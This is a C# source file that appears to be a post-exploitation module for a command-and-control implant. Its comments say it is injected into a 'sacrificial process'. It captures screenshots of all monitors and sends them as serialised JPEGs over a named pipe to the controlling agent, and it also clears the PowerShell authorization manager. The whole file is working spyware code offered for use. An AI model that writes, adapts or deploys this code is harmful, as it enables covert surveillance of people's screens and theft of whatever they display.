﻿//#define POWERPICK

using System;
using System.Management.Automation.Runspaces;
using System.IO.Pipes;
using System.Runtime.Serialization.Formatters.Binary;
using System.Security.AccessControl;
using IPC;
using System.IO;
using System.Drawing;
using System;
using System.Windows.Forms;
using System.Collections.Generic;




// Inject this assembly into the sacrificial process
namespace ScreenshotRunner
{
    public class Program
    {
        static BinaryFormatter bf = new BinaryFormatter();
        public static NamedPipeServerStream CreateNamedPipeServer(string pipeName)
        {
            PipeSecurity pipeSecurityDescriptor = new PipeSecurity();
            PipeAccessRule everyoneAllowedRule = new PipeAccessRule("Everyone", PipeAccessRights.ReadWrite, AccessControlType.Allow);
            PipeAccessRule networkDenyRule = new PipeAccessRule("Network", PipeAccessRights.ReadWrite, AccessControlType.Deny);       // This should only be used locally, so lets limit the scope
            pipeSecurityDescriptor.AddAccessRule(everyoneAllowedRule);
            pipeSecurityDescriptor.AddAccessRule(networkDenyRule);

            // Gotta be careful with the buffer sizes. There's a max limit on how much data you can write to a pipe in one sweep. IIRC it's ~55,000, but I dunno for sure.
            NamedPipeServerStream pipeServer = new NamedPipeServerStream(pipeName, PipeDirection.InOut, 10, PipeTransmissionMode.Byte, PipeOptions.None, 32768, 32768, pipeSecurityDescriptor);

            return pipeServer;
        }


        public static void InitializeNamedPipeServer(string pipeName)
        {
            NamedPipeServerStream pipeServer = null;

            try
            {
                pipeServer = CreateNamedPipeServer(pipeName);
            }
            catch (Exception e)
            {
                Console.WriteLine("ERROR: Could not start named pipe server. " + e.Message);
            }

            if (pipeServer == null)
                KillJob(JobExitCode.PipeStartError);

            try
            {
                Console.WriteLine("Pipe: " + pipeName + " Ready To Go!");
                // We shouldn't need to go async here since we'll only have one client, the agent core, and it'll maintain the connection to the named pipe until the job is done
                pipeServer.WaitForConnection();
                Console.WriteLine("Connection received to pipe.");

            }
            catch (Exception e)
            {
                pipeServer.Close();
                return;
            }

            using (StreamWriter writer = new StreamWriter(pipeServer))
            {
                writer.AutoFlush = true;
                try
                {

                    InitialSessionState state = InitialSessionState.CreateDefault();
                    state.AuthorizationManager = null;

                }
                catch (Exception e)
                {
                    Console.WriteLine("ERROR: Unhandled exception in the ScreenshotRunner: {0}\n{1}", e.Message, e.StackTrace);
                    //Console.WriteLine(e);
                }

                BinaryFormatter bf = new BinaryFormatter();

                List<byte[]> screenShots = new List<byte[]>();

                foreach (Screen screen in Screen.AllScreens)
                {
                   screenShots.Add(GetScreenshot(screen));
                }

#if DEBUG
                Console.WriteLine("Sending Screenshots Over Pipe...");
#endif
                bf.Serialize(pipeServer, screenShots);
                }

            Console.WriteLine("Waiting for client to close pipe connection...");
            while (pipeServer.IsConnected) { };
            
        }

        //Console.WriteLine("Exiting loader stub...");


        public static byte[] GetScreenshot(Screen screen)
        {
# if DEBUG
            Console.WriteLine("Grabbing Screenshot...");
#endif

            byte[] screenshot = null;

            using (Bitmap bmpScreenCapture = new Bitmap(screen.Bounds.Width,
                                            screen.Bounds.Height))
            {
                using (Graphics g = Graphics.FromImage(bmpScreenCapture))
                {
                    g.CopyFromScreen(screen.Bounds.X,
                                        screen.Bounds.Y,
                                        0, 0,
                                        bmpScreenCapture.Size,
                                        CopyPixelOperation.SourceCopy);
                    using (MemoryStream ms = new MemoryStream())
                    {
                        bmpScreenCapture.Save(ms, System.Drawing.Imaging.ImageFormat.Jpeg);
                        screenshot = ms.ToArray();
                    }
                }
            }

            return screenshot;
        }



        static void Main(string[] args)
        {

        }

        private static void KillJob(JobExitCode exitCode)
        {
            Environment.Exit((int)exitCode);
        }
    }
}

